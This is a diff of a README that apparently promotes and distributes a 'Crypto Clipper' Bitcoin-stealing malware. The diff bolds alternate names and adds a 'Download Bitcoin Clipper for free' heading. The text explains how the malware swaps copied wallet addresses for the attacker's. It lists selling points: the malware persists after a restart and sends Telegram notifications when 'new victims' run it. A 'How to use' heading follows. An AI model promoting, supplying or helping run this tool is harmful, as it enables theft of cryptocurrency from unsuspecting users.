@@ -2,13 +2,13 @@
 
 ## About
 
-Crypto Clipper, also known as a crypto stealer or BTC clipper, is a type of malicious software that poses a significant threat to cryptocurrency users. With the increasing popularity and value of cryptocurrencies like Bitcoin, cybercriminals have developed sophisticated techniques to exploit unsuspecting individuals and steal their digital assets.
+Crypto Clipper, also known as a **Crypto Stealer** or **Bitcoin Clipper**, is a type of malicious software that poses a significant threat to cryptocurrency users. With the increasing popularity and value of cryptocurrencies like Bitcoin, cybercriminals have developed sophisticated techniques to exploit unsuspecting individuals and steal their digital assets.
 
 A crypto clipper specifically targets cryptocurrency transactions by manipulating the clipboard function on infected devices. When a user copies a cryptocurrency address to the clipboard, the malware intercepts the copied address and replaces it with the attacker's address. As a result, when the user pastes the address into a transaction, the funds are unknowingly redirected to the attacker's wallet instead of the intended recipient.
 
 This form of attack primarily focuses on Bitcoin, the most widely recognized and valuable cryptocurrency. By hijacking the clipboard, the crypto clipper can easily modify Bitcoin addresses, making it difficult for users to detect the fraudulent activity until it's too late. The stolen funds can be virtually untraceable, leaving victims at a significant financial loss.
 
-In addition to being referred to as a crypto stealer or BTC clipper, this type of malware is also commonly known as a Bitcoin clipper or Bitcoin stealer. These terms highlight the specific targeting of Bitcoin transactions and the malicious intent behind the software.
+In addition to being referred to as a **Crypto Stealer** or **BTC Clipper**, this type of malware is also commonly known as a **Bitcoin clipper** or **Bitcoin stealer**. These terms highlight the specific targeting of Bitcoin transactions and the malicious intent behind the software.
 
 It is crucial for cryptocurrency users to be aware of the risks associated with crypto clippers and take proactive measures to protect their digital assets. This includes using reputable antivirus software, regularly updating their devices and applications, and exercising caution when interacting with cryptocurrency addresses. By staying informed and implementing robust security practices, users can minimize the risk of falling victim to crypto hijackers and safeguard their valuable cryptocurrencies.
 
@@ -30,6 +30,8 @@ It is crucial for cryptocurrency users to be aware of the risks associated with 
 **4) THE MALWARE RUNS AUTOMATICALLY AFTER A SYSTEM RESTART.**
 
 **5)  YOU CAN ADD THE TELEGRAM API TO RECEIVE NOTIFICATIONS WHENEVER NEW VICTIMS EXECUTE MALWARE.**
+
+## Download Bitcoin Clipper for free
 
 ## How to use
 
